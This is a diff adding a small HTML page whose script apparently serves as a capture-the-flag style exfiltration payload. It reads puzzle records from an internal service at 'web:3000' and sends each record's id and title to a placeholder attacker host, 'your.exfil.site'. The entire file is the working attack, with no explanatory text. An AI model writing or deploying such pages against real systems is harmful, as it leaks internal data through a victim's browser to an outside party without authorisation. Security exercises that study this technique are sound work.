@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    fetch("http://web:3000/puzzles")
+      .then(r => r.json())
+      .then(puzzles => {
+        puzzles.forEach(p => {
+          fetch("https://your.exfil.site/flag?id=" + encodeURIComponent(p.id) + "&title=" + encodeURIComponent(p.title));
+        });
+      });
+  </script>
+</body>
+</html>
